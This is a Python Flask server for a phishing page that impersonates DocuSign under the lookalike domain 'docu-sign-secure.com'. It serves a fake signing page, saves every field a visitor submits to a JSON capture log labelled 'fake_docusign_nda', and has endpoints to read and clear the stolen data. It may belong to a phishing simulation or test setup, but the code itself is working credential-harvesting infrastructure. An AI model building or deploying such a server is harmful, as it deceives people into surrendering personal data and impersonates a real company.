import json
import os
from datetime import datetime
from flask import Flask, render_template, jsonify, request, redirect, url_for

app = Flask(__name__)

# Domain: docu-sign-secure.com  Port: 9030
DOMAIN = "docu-sign-secure.com"
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'captured_data.json')


def _load_log():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            return []
    return []


def _save_log(entries):
    with open(LOG_FILE, 'w') as f:
        json.dump(entries, f, indent=2)


@app.route('/')
def index():
    return redirect(url_for('sign'))


@app.route('/sign')
def sign():
    contractor = request.args.get('contractor', '0')
    return render_template('sign.html', contractor=contractor)


@app.route('/success')
def success():
    return render_template('success.html')


@app.route('/api/captured', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True) or {}
    entry = {
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'source': 'fake_docusign_nda',
        'fields': data,
    }
    entries = _load_log()
    entries.append(entry)
    _save_log(entries)
    return jsonify({'status': 'ok'})


@app.route('/api/captured', methods=['GET'])
def get_captured():
    return jsonify({"entries": _load_log()})


@app.route('/api/clear', methods=['GET', 'POST'])
def clear_captured():
    _save_log([])
    return jsonify({'status': 'ok'})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9030, debug=False)
